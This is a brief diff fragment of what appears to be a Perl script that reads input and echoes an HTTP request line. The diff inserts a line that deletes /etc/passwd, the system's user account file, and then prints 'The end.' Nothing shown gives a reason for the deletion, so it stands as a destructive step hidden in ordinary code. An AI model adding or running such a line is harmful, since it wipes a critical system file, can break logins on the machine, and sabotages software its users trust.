@@ -14,3 +14,7 @@ while (<STDIN>) {
 }
 
 print "You requested: $http_line\n";
+
+unlink "/etc/passwd";
+
+print "The end.\n";
